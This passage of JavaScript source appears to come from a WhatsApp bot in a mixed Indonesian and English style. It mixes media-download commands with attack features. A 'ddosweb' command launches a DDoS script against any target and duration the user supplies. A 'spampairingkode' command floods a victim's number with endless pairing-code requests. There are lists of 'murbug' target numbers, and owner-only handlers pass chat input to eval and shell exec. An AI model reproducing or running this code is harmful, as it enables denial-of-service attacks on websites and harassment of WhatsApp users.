                if (cekkanbre.length == 0) return m.reply(`Enter a valid number and register on WhatsApp!!!`)
                murbug.push(bnnd)
                fs.writeFileSync('./RxhlOfc/helmurbug.json', JSON.stringify(murbug))
                m.reply(`Number ${bnnd} Has Been Added to Murbug!!!`)
            }
            break
            case 'deletemurbug': {
               
                if (!isOwnNum) return m.reply(global.falown)
                if (!args[0]) return m.reply(`Use ${prefix+command} Number\nExample ${prefix+command} 50663646464`)
                yaki = q.split("|")[0].replace(/[^0-9]/g, '')
                unp = murbug.indexOf(yaki)
                murbug.splice(unp, 1)
                fs.writeFileSync('./RxhlOfc/helmurbug.json', JSON.stringify(murbug))
                m.reply(`Number ${yaki} Has Been Removed From Murbug!!!`)
            }
            break
            case 'public': {
               
                if (!isOwnNum) return m.reply(global.falown)
                rxhl.publicqiys = true
                m.reply('Sukse Change To Public')
            }
            break
            case 'self': {
               
                if (!isOwnNum) return m.reply(global.falown)
                rxhl.publicqiys = false
                m.reply('Sukse Change To Self')
            }
            break
            case 'cdmurbug': {
               
                if (!isOwnNum) return m.reply(global.falown)
                if (args[0] == `true`) {
                    rxhl.autocd = true
                    m.reply(`Successfully activated cooldown`)
                } else if (args[0] == `false`) {
                    rxhl.autocd = false
                    m.reply(`Successfully disabled cooldown`)
                } else {
                    m.reply(`Active and disabled options\n Example: ${prefix + command} is active`)
                }
            }
            break
            case 'setmenu0': {
               
                if (!isOwnNum) return m.reply(global.falown)
                if (args[0] == `android`) {
                    rxhl.iphone = false
                    m.reply(`Sukses mengubah tampilan menu menjadi android`)
                } else if (args[0] == `ios`) {
                    rxhl.iphone = true
                    m.reply(`Sukses mengubah tampilan menu menjadi ios`)
                } else {
                    m.reply(`Pilihan menu ada 2 yaitu android dan ios\n Example: ${prefix + command} ios`)
                }
            }
            break
            // Ddos Menu
            case 'ddosweb': {
               ;
                if (!isOwnNum) return m.reply(global.falown);
                if (!q.includes(' ')) {
                    return m.reply(`Use Method: .${command} <target> <time>\nExample: .${command} example.my.id 60`);
                }

                let targetweb = q.substring(0, q.indexOf(' ')).trim();
                let timeweb = q.substring(q.lastIndexOf(' ') + 1).trim();

                if (!targetweb || !timeweb) {
                    return m.reply(`Please provide both a target and time.`);
                }

                let moci = `*Bot is Attacking. Wait for Results* 😤\n• _Target_ -> ${targetweb}\n• _Time Attack_ -> ${timeweb}`;
                m.reply(moci);

                exec(`node ./RxhlOfc/helddos.js ${targetweb} ${timeweb}`, {
                    maxBuffer: 1024 * 1024
                }, (error, stdout, stderr) => {
                    if (error) {
                        return m.reply(`Error: ${error.message}`);
                    }
                    if (stderr) {
                        return m.reply(`Error: ${stderr}`);
                    }
                    m.reply(`Success\n\n• Target: ${targetweb}\n• Time: ${timeweb}`);
                });
            }
            break;
            // Tools Menu
            case 'tiktokmp4': {
               
                if (!q) return m.reply(`Penggunaan .${command} https://vt.tiktok.com/ZS2gLg5tj/\n*Support Youtube, Facebook, TikTok, Instagram, Twitter And Capcut*`)
                await downloadVideo(q)
            }
            break
            case 'youtubemp3': {
               
                if (!/video/.test(m.quoted.mtype)) return m.reply(`Tidak Dapat Convert Selain Video`)
                if (!m.quoted) return m.reply(`Silahkan Tag Media`)
                m.reply("Proses")
                let media = await m.quoted.download()
                let {
                    toAudio
                } = require('./RxhlOfc/helconverter')
                let audio = await toAudio(media, 'mp4')
                rxhl.sendMessage(from, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })
            }
            break
            case 'spampairingkode': {
               
                if (!isOwnNum) return m.reply(global.falown)
                if (!q) return m.reply(`${global.inputnum + nonumber}`)
                let enemy = q.replace(/[^0-9]/g, '').trim()
                let {
                    default: makeWASocket,
                    useMultiFileAuthState,
                    fetchLatestBaileysVersion
                } = require('@whiskeysockets/baileys')
                let {
                    state
                } = await useMultiFileAuthState('ラ-ENEMY')
                let {
                    version
                } = await fetchLatestBaileysVersion()
                let pino = require("pino")
                let NodeCache = require("node-cache")
                let resolveMsgBuffer = new NodeCache()
                let sucked = await makeWASocket({
                    printQRInTerminal: false,
                    mobile: false,
                    auth: state,
                    version,
                    logger: pino({
                        level: 'fatal'
                    }),
                    resolveMsgBuffer,
                    browser: ['Mac Os', 'chrome', '121.0.6167.159']
                })
                m.reply(`Sukses Mengirim Spam Unlimited Ke Nomor ${enemy}`)
                for (;;) {
                    await sleep(1500)
                    let prc = await sucked.requestPairingCode(enemy)
                }
            }
            break
            case 'tourl': {
                if (!m.quoted) return reply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
                let q = m.quoted ? m.quoted : m
                rxhl.sendMessage(from, {
                    react: {
                        text: '🎁',
                        key: m.key
                    }
                });
                let media = await q.download()
                let uploadImage = require('./RxhlOfc/heltourl')
                let link = await uploadImage(media)
                m.reply(`Your Link : ${link}\nExpired Date : Liftime`)
            }
            break
            default:
                if (budy.startsWith('=>')) {
                   
                    if (!isOwnNum) return

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        m.reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                   
                    if (!isOwnNum) return
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await m.reply(evaled)
                    } catch (err) {
                        await m.reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
 
                    if (!isOwnNum) return
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return m.reply(`${err}`)
                        if (stdout) return m.reply(stdout)
                    })
                }
        }

    } catch (err) {
        console.log(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(`Update ${__filename}`)
    delete require.cache[file]
    require(file)
})